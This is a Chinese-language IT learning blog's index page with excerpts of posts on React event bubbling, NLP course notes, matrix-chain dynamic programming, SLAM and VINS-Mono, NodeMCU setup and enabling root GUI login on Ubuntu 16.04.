<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a49676da9de075317834a185ea2ac69c/" rel="bookmark">
			React阻止事件冒泡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 React 如何阻止事件冒泡？(https://segmentfault.com/q/1010000008966738)
答案采纳者（notebin）主页(https://segmentfault.com/u/notebin)
React 为提高性能，有自己的一套事件处理机制，相当于将事件代理到全局进行处理，也就是说监听函数并未绑定到DOM元素上。
因此，如果你禁止react事件冒泡e.stopPropagation()，你就无法阻止原生事件冒泡；
你禁用原生事件冒泡e.nativeEvent.stopPropagation()，React的监听函数就调用不到了。
正确的姿势，应该是判断event.target对象，是否是目标对象、或包含的对象、或被包含的对象，来决定是否触发事件。
以下函数就可以用来判断包含性：
function contains(root, n) { var node = n; while (node) { if (node === root) { return true; } node = node.parentNode; } return false; } Demo:
handleClick (e) { if(e.target.nodeName === 'li'){ // do something } if(contains(this.root, e.target)){ // do something } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1622e00acdff96e8b9bc9f75700d43b9/" rel="bookmark">
			CCS多核调试如何打断点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多核调试首先要打硬件断点，右键原来打断点的位置-&gt;breakpoint，选择添加硬件断点。
其次打断点的时候要把断点管理器的这个标志打开，表示断点按照核来区分，防止断点打错核
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53768438229a96c349a42123a5d16109/" rel="bookmark">
			Word 2016 插入尾注之后删除方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般我们在书写科研论文时，需要插入参考文献，word 中比较方便插入参考文献的方式是插入尾注
如上图所示：
用过很多方法，第一次写论文的时候，由于对word 这些技巧不太了解，所以当时用了蛮力去写了第一篇的论文，主要就是用到哪篇论文了，然后就插入一下，等这样写完初稿之后，再来回删改参考文献就会显得相当的麻烦，不仅前文的参考文献次序需要修改，后面的次序也要修改。
前段时间偶然发现了一个插入尾注的方法，然后我们就试用了一下，发现非常好用，前后会有连接关系，并且如果后续增删参考文献的时候，可以做到自动排序。也确实，像word 这样优秀的文字排版软件，肯定是有很多实用的功能，我们一般人没有发现。
一些要点记录：
我们插入尾注之后，会出现一条横线，这条横线是参考文献和正文的分隔线，如果第一次没有留意，事后忘记的话，要改的时候还挺难找到原因，当然word 中莫名出现横线的情况有很多，这个算是最为隐蔽的一种情况了。
解决方法的话，各个版本的word 方法不一样。这里仅说word 2016 版本中的去除横线的方法。
首先点击视图选项，然后选择草稿视图，如上图所示
随后选择引用，选择显示备注。然后在word 的下方出现了一个尾注的备选框，我们发现有一条横线，这时，我们把横线删除即可。这个粗的短线删不掉，也不知道是干嘛用的。如果发现参考文献中间的页面中有一条横线，我们从下拉选项中选择尾注延续分隔符，然后删掉即可。
纠结了一个下午的问题终于得到了解决。
记录下来以免忘记。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd40bd31ebdecd45fbda15446e5fdb32/" rel="bookmark">
			斯坦福大学-自然语言处理入门  笔记 第五课 拼写纠正与噪音通道（Noisy Channel）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、拼写纠正任务 1、拼写任务 发现拼写错误纠正拼写错误 自动纠正给出纠正建议（一个词）给出纠正建议（一些词） 2、拼写错误的类型 拼写出来的不是单词（non-word spelling error）：graffe→giraffe拼写出来的是另一个单词 排字（Typographical ）错误：three→there认知错误（同音异形）：too→two 3、拼写出来的不是单词的错误（non-word spelling error） 错误发现：预先有一个字典，任何不在字典中的单词就是错误，字典越大越好错误纠正： 生成修正可选项：和错误相似的实际单词选择最好的那个 最短加权编辑距离最高噪音通道（noisy channel）概率 4、拼写出来是另一个单词（real word spelling error) 对每一个单词，w，生成一个候选集（candidate set） 找到发音相似的候选词找到拼写相似的候选词把w也放在候选集中 选择最好的候选词 噪音通道分类 二、拼写的噪音通道（noisy channel）模型 1、噪音通道模型 初始想法：一开始初始单词（original word）经过噪音通道（noisy channel）会生成噪音单词（noisy word）。我们通过对噪音单词的解码得到猜测的单词（guessed word）。
噪音通道模型：当我们拿到一个拼错的单词x的时候，我们可以利用下面的公式得到正确的w。
P（w）表示语言模型P（x|w）表示通道模型（channel model）或者是错误模型（error model） 2、从拼写出来的不是单词的错误（non-word spelling error）开始 错误是：acress候选词生成（candidate generation） 相似拼写的单词：找到最小的编辑距离相似发音的单词：找到发音的最小的编辑距离这里选取相似拼写来举例子 编辑距离：我们采取Damerau-Levenshtein编辑距离 对两个字符串而言，之间的基本编辑操作是：插入、删除、替换和两个相邻的字母的交换以acress来举例子来看编辑操作
80%的错误都是编辑距离为1的错误所有的错误都是编辑距离为1或者2的错误同时也包含连字符-和空格的插入 thisday→ this dayinlaw→in-law 语言模型 包含任何我们之前学习的语言模型算法，包括一元、二元、三元以及stupid backoff（针对web规模的拼写纠正）以acress的候选集举例，来看他们的语言模型
通道模型概率 又称错误（error model）模型概率，编辑（edit）概率定义： 拼错的单词X=X1，X2，X3…Xm纠正的单词w=w1，w2，w3…wmP（X|w）表示编辑概率 计算：混淆矩阵 计算公式
其中，
对这四种编辑公式，我们分别构造混淆矩阵，一共是四个混淆矩阵，形如下图
以acress举例，通道模型计算如下
以acress举例，噪音通道概率计算如下：
改进：使用二元语言模型 在大部分的情境下，二元模型会更准确例子如下：
3、评估 我们可以利用一些拼写错误测试集进行评估
三、拼写出来是另一个单词的错误纠正（real-word spelling correction) 1、解决方案 对句子中的每一个单词 生成候选集，包含（单词本身、同音异形词，和原来的单词之差一个字母编辑的单词） 选择最好的候选（用噪音通道，或者分类） 2、公式描述 给定一个句子包含一系列单词w1，w2，w3,…,wn对每个单词都生成一系列的候选词（candidate）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd40bd31ebdecd45fbda15446e5fdb32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b37087f9833372678031b4523181e35b/" rel="bookmark">
			矩阵连乘问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.定义
完全加括号的矩阵连乘积可递归定义为：
(1) 单个矩阵是完全加括号的；
(2) 矩阵连乘积A是完全加括号的，则A可表示为2个完全加括号的矩阵连乘积B和C的乘积并加括号，即A=(BC)
例如，有四个矩阵ABCD相乘，那么所有的完全加括号结果为(A((BC)D)) (A(B(CD))) ((AB)(CD)) (((AB)C)D) (A(BC))D)
如果一个矩阵的连乘积的计算次序完全确定，也就是该连乘积已完全加括号，则可以依照此次序反复调用两个矩阵相乘的标准算法计算出矩阵连乘积。
二. 问题描述
给定n个矩阵{A1,A2,…,An}，其中Ai与Ai+1是可乘的，其中i=1,2,…n-1。如何确定矩阵连乘积的计算次序，使得依此次序计算矩阵连乘积需要的数乘次数最少。
三. 问题解决
穷举法
列举出所有可能的计算次序，并计算出每一种计算次序所需要的数乘次数，从中找到数乘次数最少的计算次序。
详细请看——暴力求解：输出矩阵连乘所有的完全加括号形式动态规划
将矩阵链记为A[i:j]，动态规划的思想跟分治法的思想类似，就是将待求解的问题分解成若干个子问题求解。我们把矩阵链从某个点断开，分为左右两个子矩阵链，分别记为A[i:k]和A[k+1:j]，其中i&lt;=k&lt;j。我们可以发现到：计算A[i:j]的最优次序所包含A[i:k]和A[k+1:j]的计算次序也是最优的，很明显具有最优子结构性质，这种性质是可用动态规划算法求解问题的显著特征。 记矩阵链A[i:j]的最少数乘次数为m(i,j)，我们可以发现，
当i=j时，矩阵链只有一个矩阵元素，那么m[i,j]=0。
当i!=j时，我们要考虑将矩阵链从某个点断开，使得以该方式断开后的数乘次数最少。
m[i,j]=m[i,k]+m[k+1,j]+p(i-1)p(k)p(j)，i&lt;=k&lt;j
其中矩阵Ai的大小为p(i-1)xp(i)。这时候我们只要找到使m[i,j]最小的k值即可。
//p储存矩阵的大小，n为矩阵链的长度，m保存最少数乘次数，s保存最佳断开位置 void MatrixChain(int *p,int n,int **m,int **s) { for(int i=1;i&lt;=n;i++) m[i][i]=0; for(int r=2;r&lt;=n;r++) //r表示矩阵链的长度 { for(int i=1;i&lt;=n-r+1;i++) { int j=i+r-1; m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; s[i][j]=i; for(int k=i+1;k&lt;j;k++) { int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; if(t&lt;m[i][j]) { m[i][j]=t; //保存最小值 s[i][j]=k; //保存最佳断开位置 } } } } } 备忘录方法
在使用备忘录方法前我先来实现一下用递归来求解矩阵连乘的最少数乘次数。 int Matrix(int i, int j) { int minvalue =INT_MAX, temp; if(i==j) return 0; for(int k=i; k&lt;j; k++) { temp=Matrix(i,k) + Matrix(k+1,j) + p[i-1]*p[k]*p[j]; if(temp&lt;minvalue) { minvalue=temp; m[i][j]=k; } } return minvalue; } 因为在递归求解中会有很多重复的计算，导致算法效率不高。备忘录的方法就是用来解决这个问题的，它为每个解过的子问题建立了备忘录以备需要时查看，避免了相同子问题的重复求解。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b37087f9833372678031b4523181e35b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6447ac4b9d84bf9ba474c73045fe43e1/" rel="bookmark">
			斯坦福大学-自然语言处理入门  笔记 第四课 语言模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍N-grams 1、概率语言模型 对每个句子给出一个概率，用以判断机器翻译中哪个句子是最佳的选择，拼写校准中哪个句子可能出现错误。
目标：计算句子或者是一系列单词的概率
P ( W ) = P ( W 1 , W 2 , W 3 , W 4 , W 5 . . . W n ) P\left ( W \right )=P(W_{1},W_{2},W_{3},W_{4},W_{5}...W_{n}) P(W)=P(W1​,W2​,W3​,W4​,W5​...Wn​)相关任务：下一个词的概率
P ( W 5 ∣ W 1 , W 2 , W 3 , W 4 ) P\left ( W_{5}|W_{1},W_{2},W_{3},W_{4} \right ) P(W5​∣W1​,W2​,W3​,W4​)计算上述两者的模型就是语言模型。可能更好的叫法是语法（the grammer)，但是语言模型（language model）和LM是标准的叫法。 2、如何计算P(W) 利用概率的链式法则来进行计算
链式法则
P ( x 1 , x 2 , x 3 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6447ac4b9d84bf9ba474c73045fe43e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c39e2ba4d963d7a0e6c9ac58e9ae5f83/" rel="bookmark">
			C#中Atan()与Atan2()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简言之：
Atan2(y,x)代表的含义与Atan(y/x)含义相同。
实际上，Atan2()是Atan()的升级版。它更加稳定。
atan(y/x)，当 y 远远大于 x 时，计算结果是不稳定的。
atan2(y,x)的做法：当 x 的绝对值比 y 的绝对值大时使用 atan(y/x)；反之使用 atan(x/y)。这样就保证了数值稳定性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23f80759f1834d004e0ef58bc0a36600/" rel="bookmark">
			SLAM：现在，未来和鲁棒感知时代
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 SLAM 研究的时代划分the classical age (1986 - 2004)the algorithmic-analysis age (2004 - 2015)the robust-perception age (now) 自主机器人真的需要SLAM吗？SLAM问题被解决了吗？SLAM算法鲁棒性SLAM算法鲁棒性面临的主要挑战数据关联（data association）恶劣环境（harsh environment） 研究现状前端短期数据关联（short-term data association）前端长期数据关联（long-term data association）前端回环闭合检测（loop closure detection ）前端回环闭合验证（loop closure validation） 后端回环闭合验证动态环境的处理 待解决的问题（open problem）SLAM失效保护和恢复（failsafe SLAM and recovery）对硬件失效的鲁棒性（robustness to HW failure）几何重定位（metric relocalization）随时间变化的、可变形的地图（time varing and deformable map）自动化调参（Automatic parameter tuning） SLAM的场景尺度（scalability）研究现状节点、边缘稀疏化（node and edge sparsification）去中心化（并行）SLAM（out-of-core (parallel) SLAM）分布式多机器人SLAM（distributed multi robot SLAM） 待解决的问题地图维护（map maintenance）鲁棒分布式建图（robust distributed mapping）学习，遗忘，记忆（learning, forgetting, remembering）资源有限的平台（resource-constrained platform） 地图表示：几何度量推理（metric reasoning）稀疏路标表示（landmark-based sparse representation）低层原始数据稠密表示（low-level raw dense representation）边界和空间分割稠密表示（boundary and spatial-partitioning dense representation）基于物体的高阶表示（high-level object-based representation）待解决的问题（open problem）SLAM中的高层表示（high-level, expressive representations in SLAM）最优表示(optimal representations)自动、自适应表示（automatic, adaptive represetation） 地图表示：语义推理（semantic reasoning）语义SLAM vs 拓扑SLAM（semantic SLMA vs topological SLAM）语义的结构和具体内容（semantic SLAM: structure and detail of concepts）语义建图的研究现状待解决的问题（open problem）语义建图不只是一个分类问题忽略、察觉和适应（ignorance, awareness, and adaptation）基于语义的推理 SLAM中的新理论工具主动SLAM（active SLAM）SLAM中的新传感器 本文为对综述论文 Simultaneous Localization And Mapping: Present, Future, and the Robust-Perception Age的理解和心得，本文受众为，对SLAM问题有一个全面的基础认知，想进一步寻找SLAM研究方向的童鞋。 对该综述论文的学习还可以参考： 【泡泡机器人翻译专栏】SLAM: 现在，未来和鲁棒年代（一） 【泡泡机器人翻译专栏】SLAM: 现在，未来和鲁棒年代（二） 【泡泡机器人翻译专栏】SLAM: 现在，未来和鲁棒年代（三） 【泡泡机器人翻译专栏】SLAM: 现在，未来和鲁棒年代（四） 【泡泡机器人翻译专栏】SLAM: 现在，未来和鲁棒年代（五） SLAM 研究的时代划分 Cadena等人把SLAM问题的研究划分为3个时代：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23f80759f1834d004e0ef58bc0a36600/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5142dc3844a5cf663399faa4875d2ad6/" rel="bookmark">
			NodeMcu开发(一)---开发环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天nodemcu的板子终于到了, 等了足足五天呐, 这快递真是醉了, 迫不及待的搭建环境了
新的板子是没有nodemcu库的, 需要我们自己来移植, 首先移植nodemcu的库吧
一 移植nodemcu库
首先先讲一下怎么刷固件，首先你需要安装ch340串口驱动（有的版本可能是别的串口设备, 根据你的板子串口芯片来选啧）。然后确定的得设备串口号，这个可以通过计算机的设备管理里看到, 以下图是我的板子
固件在官网上有下载, 网址:https://nodemcu-build.com/ 官方的在线编译工具，这个工具会把你定制的固件发到你的邮箱，一般会发送两个固件一个名字中带float 表示支持浮点，另一个名字中带integer，表示只有整数支持, 下载固件的步骤如下:
1. 填写你接受固件的邮箱(QQ邮箱不行), 我用的网易的邮箱
2. 选择自己需要的功能模板库, 要什么选什么, 一般把默认的选上, 然后加上自己要的, 不要全选, 因为你的板子内存没这么大, 按需求选, 还有Select branch to build from这一块不要选, 默认就可以了,
下面的其他的不用选了, 直接跳过, 提交申请就可以了, 如下图的点start your build就可以了
然后关注自己的邮箱就可以, 一般会发两封邮件, 第一封告诉你在budilng着, 后面一封才是有固件链接地址的, 如下图所示
有两种类型的, 一种是float的 支持浮点运算, 文件更大, interger只支持整形运算, 文件较小, 视自己的板子和项目需求下载.
到此处我们固件下好了, 接下来我们还要下载刷固件的软件, 我用的是官方自带的刷固件软件(后文有链接下载), 下载后根据自己的系统选择x86(32位系统), x64(64位系统), 进相应的文件
进去后一直点进去, 直到看到这一级目录, 点开esp8266Flasher就行了, 点开界面如下
点开后先选择config选项, 第一行选择自己的固件所在的目录, 后面的地址设置为0x0000, 如下图所示:
然后设置串口信息, 点advanced选项, 会出现波特率, 选9600和15200都没事, 15200更快一点, flash size就根据你的esp8266的版本来选择大小了, 不知道的可以去乐鑫官网或者问淘宝卖家flash大小(这个前外别选错), 下面的默认就行, 如下图所示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5142dc3844a5cf663399faa4875d2ad6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ec44227cc90f7d74d5a4601ee44f798/" rel="bookmark">
			斯坦福大学-自然语言处理入门 笔记  第三课 最小编辑距离
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、定义最小编辑距离 1、最小编辑距离的用途 拼写矫正 用户输入graffe，那么哪一个是最接近的？graf？graft？grail？还是giraffe 计算生物学 用来校准核酸序列
校准（alignment）结果
同时也用于机器翻译，信息抽取等领域 2、编辑距离 两个字符串间最小的编辑距离就是将其中一个变成另外一个时需要的最小的编辑操作次数（操作包含插入、删除、替代）。
举例而言，当两个字符串是intention和execution的时候，操作如下：其中d表示删除操作，s表示替代操作，i表示插入操作
当每个操作的代价为1时，两者的距离为5当替代操作代价为2，其他保持不变时，两者的距离为8（Levenshtein） 在计算生物学中的例子，原始序列：
校准序列：（要么用字母校准，要么用空缺校准）
NLP的编辑距离还可以用来评价机器翻译（machine translation）和演讲识别（speech recognition）
还可以用于命名实体抽取和实体指代。
3、如何找到最小编辑距离 从最初的字符串到最后的字符串的路径（一系列的编辑操作）
原始状态：需要转换的单词操作：插入、删除、替代目标状态：我们想要得到的单词路径代价：我们需要最小化的目标（操作的次数）
从最初的字符串到最后的字符串的路径其实是很多的，我们不需要关注所有，只需要关注最短的路程。 4、定义最小编辑距离 对于两个字符串 X的长度是nY的长度是m 我们定义D(i,j) X[1…i]和Y[1…j]之间的距离i.e X的前i个字符和Y的前j个字符 X和Y的编辑距离是D(n,m) 二、如何计算最小编辑距离 1、动态规划算法 对D(n,m)进行列表式计算(tabular computation),通过整合子问题的解决方案来解决问题自下而上 对很小的i,j计算D(i,j）基于之前计算的比较小的值来计算更大的D(i,j)i.e 对i(0&lt;i&lt;n)和j(0&lt;j&lt;m)来计算D(i,j) 2、定义最小编辑距离（Levenshtein） 例子：
三、计算对应的回溯（backtrace for computing aligents） 单纯编辑距离的计算是不够的 我们需要得到两个字符串中相互对应的字符 我们解决这个方法的手段是利用指针进行回溯当我们进入到一个格子（如上图的表格）的时候，我们需要记得前一个格子（利用指针）当我们到达右上角的时候 就从右上角开始回溯，来找到对应的字符
包含指针之后，整体算法调整如下：
算法复杂度 时间复杂度：O（nm）空间复杂度：O（nm）回溯：O（n+m） 四、加权编辑距离 1、 为什么要对计算进行加权？ 拼写错误：有些单词更容易拼错生物：某些删除和插入更加容易发生 2、 加权编辑距离算法 五、计算生物学中的最小编辑距离 1、进行序列对应的原因 比较不同的生物的基因和部位组合片段获得DNA比较以找出基因突变 2、NLP和计算生物学的不同 NLP讨论的是距离的最小化和权重计算生物学讨论的是最大化的相似度和得分（socre） 3、Needleman-Wunch 算法 4、基础算法的变动 在基因片段的开始和结束对不上是很有可能的，因此不应该对这两种情况进行惩罚。
改变一：初始化
改变二：termination
对应位置问题（local alignment problem）：两个字符串可能是在他们的中部才有相似的部分。比如
变化一：初始化
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ec44227cc90f7d74d5a4601ee44f798/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35ccca6d57af8feeaf663d3b468a46a0/" rel="bookmark">
			VINS-Mono详解（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 VINS-Mono前端概述入口函数main()回调函数img_callback()发布频率控制特征点提取与光流跟踪单目处理逻辑双目处理逻辑 FeatureTracker::readImage()函数更新特征点id VINS-Mono前端概述 VINS-Mono将前端封装为一个ROS节点feature_tracker，该节点订阅相机图像话题数据后，提取特征点（cv::GoodFeatureToTrack()检测的角点），然后用KLT光流进行特征点跟踪。feature_tracker节点将跟踪的特征点作为话题进行发布，供后端ROS节点使用。同时feature_tracker_node还会发布标记了特征点的图片，可供Rviz显示以供调试。
前端节点的实现在feature_tracker目录下的src中，src里共有3个头文件和3个源文件：
tic_toc.h中是作者自己封装的一个类TIC_TOC，用来计时；parameters.h和parameters.cpp处理前端中需要用到的一些参数；feature_tracker.h和feature_tracker.cpp实现了一个类FeatureTracker，用来完成特征点提取和特征点跟踪等主要功能；feature_tracker_node.cpp构造了一个ROS节点feature_tracker_node，主要调用FeatureTracker类来实现前端功能。 入口函数main() 前端的入口函数为feature_tracker_node.cpp中的main()函数。在main()函数中，首先创建名为“feature_tracker”的节点，然后调用parameters.cpp中定义的函数readParameters()，读取特征点提取和跟踪需要用到的一些配置参数。
在feature_tracker_node.cpp的开头，main()函数之外，会创建由FeatureTracker类的实例组成的数组trackerData[NUM_OF_CAM]，其中NUM_OF_CAM为相机的个数，这意味这每一个相机都有一个FeatureTracker的实例，每个相机的FeatureTracker实例通过调用成员函数FeatureTracker::readIntrinsicParameter()，来读取每个相机各自对应的内参。
特别的，如果相机是鱼眼相机，需要读取FISHEYE_MASK，存到相机FeatureTracker的实例的成员变量fisheye_mask中，它会在后续操作中被用来去除边缘噪点。
接着定义一个订阅器和两个发布器。订阅器sub_img从话题IMAGE_TOPIC中订阅相机图像数据，回调函数为img_callback()。发布器pub_img在名为feature的话题下发布一条类型为sensor_msgs::PointCloud的消息，该话题消息为从相机图像中跟踪的特征点。发布器pub_match在名为feature_img的话题下发布一条类型为sensor_msgs::Image的消息，该话题消息为标记出了特征点的图像。
nametopictype消息内容subscribersub_imgIMAGE_TOPICsensor_msgs::Image相机图像数据publisherpub_imgfeaturesensor_msgs::PointCloud跟踪的特征点publisherpub_matchfeature_imgsensor_msgs::Image标记出了特征点的图像 接着便循环等待回调函数，直至程序退出。
回调函数img_callback() 前端的功能主要就在img_callback()，每当接收到从IMAGE_TOPIC话题订阅的数据，就会进入回调函数img_callback()进行处理。
发布频率控制 并不是每处理一帧图像，都将特征点检测跟踪结果发布出去。数据发布频率由配置参数FREQ给定，通过PUB_THIS_FRAME控制是否发布当前帧的检测跟踪数据，将数据平均发布频率稳定在FREQ：如果当前统计时间内的平均数据发布频率快于FREQ，则将PUB_THIS_FRAME置为false，只进行特征点的跟踪，但不发布当前帧的数据；否则，将PUB_THIS_FRAME置为true，进行特征点的跟踪且发布当前帧的数据。
特征点提取与光流跟踪 这一部分代码可处理单目相机和双目相机两种情况。
单目处理逻辑 如果是单目相机（双目开关STEREO_TRACK为0），则只有一个相机：相机0。调用FeatureTracker::readImage()函数，读取单目图像数据，然后在readImage()函数中，对前一帧图像中的特征点进行金字塔光流跟踪，必要时检测新的特征点对特征点数量进行补充。
双目处理逻辑 如果是双目相机（双目开关STEREO_TRACK为1），则有两个相机：相机0和相机1。对于相机0：在readImage()函数中，前后两帧图像之间进行金字塔光流跟踪，必要时在当前帧中检测新特征点以补充特征点数量。对于相机1：如果需要发布当前帧的数据（PUB_THIS_FRAME为true），且相机0的前一帧图像中特征点数量不为空，则直接在回调函数img_callback()中，相机1的当前帧图像对相机0的前一帧图像进行金字塔光流跟踪，这里光流跟踪的处理过程与单目模式下的类似，只是不会补充新的特征点；否则不需要进一步处理。
FeatureTracker::readImage()函数 FeatureTracker类中的主要处理函数就是readImage()，在这个函数中涉及到几个变量名，需要对它们的含义进行特别说明（以下说明针对单目模式，其含义并不适用于双目模式），否则根据变量名称去揣测其含义会出错。
图像数据变量：
prev_img： 上一次发布数据时对应的图像帧cur_img： 光流跟踪的前一帧图像，而不是“当前帧”forw_img： 光流跟踪的后一帧图像，真正意义上的“当前帧” 特征点数据变量：
prev_pts： 上一次发布的，且能够被当前帧（forw）跟踪到的特征点cur_pts： 在光流跟踪的前一帧图像中，能够被当前帧（forw）跟踪到的特征点forw_pts： 光流跟踪的后一帧图像，即当前帧中的特征点（除了跟踪到的特征点，可能还包含新检测的特征点） FeatureTracker::readImage()函数的处理流程为：
如果控制参数EQUALIZE为true，调用cv::createCLAHE对图像进行自适应直方图均衡处理；
调用cv::calcOpticalFlowPyrLK()对前一帧的特征点cur_pts进行金字塔光流跟踪，得到forw_pts。status标记了cur_pts中各个特征点的跟踪状态，根据status将跟踪失败的特征点从prev_pts、cur_pts和forw_pts中剔除，而且在记录特征点id的ids，和记录特征点被跟踪次数的track_cnt中，也要把这些跟踪失败的特征点对应位置的记录删除。被status标记为跟踪正常的特征点，在当前帧图像中的位置可能已经处于图像边界外了，这些特征点也应该被删除，删除操作同上。
如果不需要发布当前帧的数据，则直接将当前帧forw的相关数据赋给上一帧cur，然后在这一步整个readImage的流程就结束了。
如果需要发布当前帧的数据，先调用FeatureTracker::rejectWithF()函数，剔除outliers。具体方法为：调用cv::findFundamentalMat()对prev_pts和forw_pts计算F矩阵，通过F矩阵去除outliers。剩下的特征点track_cnt都加1。
调用FeatureTracker::setMask()，通过设置一个mask，使跟踪的特征点在整幅图像中能够均匀分布，防止特征点扎堆。FeatureTracker::setMask()的具体操作为：对光流跟踪到的特征点forw_pts，按照被跟踪到的次数降序排列，然后按照降序遍历这些特征点。每选中一个特征点，在mask中将该点周围半径为MIN_DIST的区域设置为0，后面不再选取该区域内的特征点。这样会删去一些特征点，使得特征点分布得更加均匀，同时尽可能地保留被跟踪次数更多的特征点。
由于光流跟踪到的特征点会减少，而且setMask()的处理过程中也会删除一些特征点，所以需要新检测一些特征点（只有需要发布数据时，才会检测新的特征点，否则只跟踪，不检测新的特征点）。具体操作为：调用cv::goodFeaturesToTrack()在mask中不为0的区域检测新的特征点，将特征点数量补充至指定数量。然后调用FeatureTracker::addPoints()，将新检测到的特征点到forw_pts中去，id初始化为-1，track_cnt初始化为1。
更新特征点id 特征点id相当于特征点的身份证号，对数据关联（data association）至关重要。需要注意的是，更新特征点id的步骤被特意放到了回调函数img_callback()中，而不是FeatureTracker::readImage()函数内部。有一种说法是，n_id是FeatureTracker类的静态变量：
static int n_id; FeatureTracker类的多个实例对象会共享一个n_id，在readImage()函数内部更新特征点id的话，如果多个相机并行调用readImage()，它们都要去访问n_id并改变它的值，可能会产生问题。我有一个疑问：为什么会出现多个相机并行调用readImage()的情况，因为从源代码来说，可以保证多个相机的调用存在时序上的先后关系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2efb748703f8ce1cfc0bb380e8f3172b/" rel="bookmark">
			ubuntu16.04设置root用户登陆图形界面的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为 ubuntu 默认不能使用root登录图形界面，且Ubuntu默认的是root用户不能登录图形界面的，只能以其他用户登录图形界面。这样就很麻烦，因为权限的问题，不能随意复制删除文件，用gedit编辑文件时经常不能保存，只能用vim去编辑。下面的步骤是怎样使ubuntu16.04用root用户登陆图形界面。
如果当前是图形界面的 guest登录页面，按 Ctrl Alt F1 进入命令行， 用root登录。
1、如果没密码，给root设置密码，在中端中输入：sudo passwd root。
2、在终端，输入sudo vi /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf
3、添加一行：greeter-show-manual-login=true 和
allow-guest=false 保存关闭。如下所示
4、如果现在用root用户在图形界面登录会有错误，读取/root/.profile时发生错误：mesg:tty n 还需要做如下修改，输入:
vi /root/.profile，找到 mesg n，将其替换成 tty -s &amp;&amp; mesg n。如下所示:
5、重启就可以用root用户登陆了.
( 亲测有效 16.04版本ubuntu )
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bea97eeafa3a13016463ef3fd31c307/" rel="bookmark">
			hdu4317（kd树模板）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
